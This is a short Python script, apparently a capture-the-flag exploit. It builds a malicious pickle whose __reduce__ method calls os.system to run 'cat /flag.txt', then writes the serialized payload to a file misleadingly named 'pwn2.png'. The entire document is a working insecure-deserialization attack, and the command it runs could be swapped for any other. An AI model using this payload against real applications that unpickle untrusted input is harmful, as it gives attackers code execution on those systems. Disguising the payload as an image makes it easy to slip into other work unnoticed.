import pickle
import os

class evilPickle(object):
    def __reduce__(object):
        return (os.system, ("cat /flag.txt",))

pickle_data = pickle.dumps(evilPickle())

p = pickle.dumps(evilPickle())
open("pwn2.png", "wb").write(p)
